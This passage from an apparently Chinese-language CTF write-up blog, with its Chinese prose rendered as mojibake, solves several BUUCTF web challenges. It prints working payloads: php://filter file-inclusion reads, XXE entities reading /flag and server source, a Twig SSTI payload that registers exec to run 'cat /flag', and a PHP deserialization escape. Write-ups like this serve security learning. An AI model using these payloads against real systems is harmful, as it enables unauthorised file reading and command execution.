class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>è€Œå‰é¢çš„æ­£åˆ™ä¸­è¿‡æ»¤äº†å¾ˆå¤šï¼ˆdirå¯ä»¥ç”¨ï¼‰ï¼Œcatå¯ä»¥ä½¿ç”¨ca\tæ¥ç»•è¿‡</p><p>tmdæˆ‘ä¹Ÿä¸çŸ¥é“å’‹å›äº‹ï¼Œå°±ä¸€ç›´ä¸æˆåŠŸâ€¦ï¼ˆä¸çŸ¥é“æ˜¯postçš„abçš„é—®é¢˜è¿˜æ˜¯ä¼ cmdçš„é—®é¢˜ï¼‰ç„¶åå°±çªç„¶æˆåŠŸäº†ï¼Œï¼Œï¼Œä¹Ÿä¸çŸ¥é“æ˜¯å“ªé‡Œå†™çš„æœ‰é—®é¢˜ã€‚</p><p>å¯¹äº†ï¼ŒGETæ”¹POSTçš„æ—¶å€™å‘çš„åŒ…ä¹Ÿè¦æ”¹ã€‚</p><h1 id="0x28-BSidesCF-2020-Had-a-bad-day"><a href="#0x28-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0x28.[BSidesCF 2020]Had a bad day"></a>0x28.[BSidesCF 2020]Had a bad day</h1><blockquote><p>  è€ƒç‚¹å°±æ˜¯æ–‡ä»¶åŒ…å«</p></blockquote><p>urlä¸­åŠ äº†â€™åæŠ¥äº†é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(meowersâ€˜â€™.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;meowersâ€˜â€™.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure><p>å¯èƒ½æœ‰æ–‡ä»¶åŒ…å«çš„æ´ï¼Œç„¶åç”¨phpä¼ªåè®®è¯»index.phpï¼Œè¿™é‡Œåªå†™åˆ°äº†indexï¼Œåé¢çš„phpä»£ç ä¼šè‡ªå·±åŠ ä¸Šï¼š</p><p><code>category=php://filter/read=convert.base64-encode/resource=flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.....other html</span><br><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line">if(isset($file)) &#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)) &#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">.....other html</span><br></pre></td></tr></table></figure><p>ç„¶åè¯•äº†ä¸‹ï¼š<code>category=woofers/../flag</code>ï¼Œå‡ºç°äº†<code>&lt;!-- Can you read this flag? --&gt;</code></p><p>ä¹‹åçœ‹åˆ°äº†å¯ä»¥è¿™æ ·æ–‡ä»¶åŒ…å«ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">category=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">category=php://filter/read=convert.base64-encode/woofers/resource=flag</span><br><span class="line">è¿™æ ·æ—¢æœ‰woofersï¼Œä¹Ÿä¸ä¼šå½±å“æ–‡ä»¶åŒ…å«</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‹¿åˆ°flag</p><h1 id="0x29-NCTF2019-Fake-XML-cookbook"><a href="#0x29-NCTF2019-Fake-XML-cookbook" class="headerlink" title="0x29.[NCTF2019]Fake XML cookbook"></a>0x29.[NCTF2019]Fake XML cookbook</h1><blockquote><p>  è€ƒç‚¹ï¼šXXE</p><p>  <a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p><p>  <a href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p></blockquote><p>é¦–å…ˆçœ‹é¢˜ç›®å°±çŸ¥é“åº”è¯¥æ˜¯XXEï¼Œæºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&#x27;text/javascript&#x27;</span>&gt; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line"><span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">alert(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).text(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).text(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f2487a-3114-4754-a3cf-450a6d829bde.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Sat, 14 Dec 2019 15:09:41 GMT</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;1542-599ab5e1d7740-gzip&quot;</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>191</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span></span><br><span class="line"><span class="meta"><span class="xml"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="xml"><span class="meta">&lt;!ENTITY <span class="meta-keyword">penson</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="xml">]&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;penson;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿˜çœ‹åˆ°ä¸€ä¸ªå¸ˆå‚…å†™çš„payloadå¯ä»¥è¯»doLogin.phpæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>è§£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; </span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x2A-BJDCTF2020-Cookie-is-so-stable"><a href="#0x2A-BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="0x2A.[BJDCTF2020]Cookie is so stable"></a>0x2A.[BJDCTF2020]Cookie is so stable</h1><blockquote><p>  SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´ï¼š</p><p>  <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a></p></blockquote><p>æµ‹è¯•è¾“å…¥<code>&#123;&#123;7*'7'&#125;&#125;</code>ç»“æœä¸ºï¼š49ï¼Œæ˜¯Twigã€‚</p><p>ç„¶åæ³¨å…¥ç‚¹æ˜¯åœ¨userï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>48beec68-7c7c-44aa-8133-ee13e7e06236.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://48beec68-7c7c-44aa-8133-ee13e7e06236.node4.buuoj.cn:81/flag.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=a792e0ea6d47a5e6e773e46b2b494dc1; user=%7B%7B7%2A%277%27%7D%7D</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨ä¸Šé¢æ–‡ç« çš„payloadï¼š</p><p><code>user=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><h1 id="0x2B-ASIS-2019-Unicorn-shop"><a href="#0x2B-ASIS-2019-Unicorn-shop" class="headerlink" title="0x2B.[ASIS 2019]Unicorn shop"></a>0x2B.[ASIS 2019]Unicorn shop</h1><blockquote><p>  è€ƒç‚¹æ˜¯ç¼–ç ç›¸å…³çš„é—®é¢˜ï¼š</p><p>  <a href="https://xz.aliyun.com/t/5402#toc-0">https://xz.aliyun.com/t/5402#toc-0</a></p></blockquote><p>è¿›å»ä¹‹åè®©ä½ ä¹°ä¸œè¥¿ï¼Œå¹¶ä¸”åªèƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦<code>Only one char(?) allowed!</code>ï¼Œï¼ˆè¦ä¹°ç¬¬å››ä¸ªæœ€è´µçš„é‚£ä¸ªï¼‰</p><p>æœ‰ä¸ªç½‘å€ï¼š<a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>æœç´¢thousandé€‰ä¸€ä¸ªå¤§é›¨1337çš„å°±å¯ä»¥æ‹¿åˆ°flag</p><p>æˆ‘é€‰çš„æ˜¯ï¼š<code>0xF0 0x90 0x84 0xAE</code>ï¼Œç„¶åæ”¹ä¸º%å°±å¯ä»¥äº†</p><h1 id="0x2C-å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#0x2C-å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="0x2C.[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>0x2C.[å®‰æ´µæ¯ 2019]easy_serialize_php</h1><blockquote><p>  è€ƒç‚¹å°±æ˜¯PHPååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸</p><p>  <a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p>  è‡ªæˆ‘æ„Ÿè§‰æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é¢˜ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ phpinfoçš„æ—¶å€™å‘ç°äº† d0g3_f1ag.phpæ–‡ä»¶ã€‚auto_append_fileåœ¨æ‰€æœ‰é¡µé¢çš„åº•éƒ¨è‡ªåŠ¨åŒ…å«æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">extract</span>(<span class="params"><span class="variable">$_POST</span></span>) å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ä¹‹åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a å…¶é•¿åº¦ä¸º24ï¼Œä½œä¸ºä¸€ä¸ªæ•´ä½“æˆäº†userçš„å€¼</span></span><br><span class="line"><span 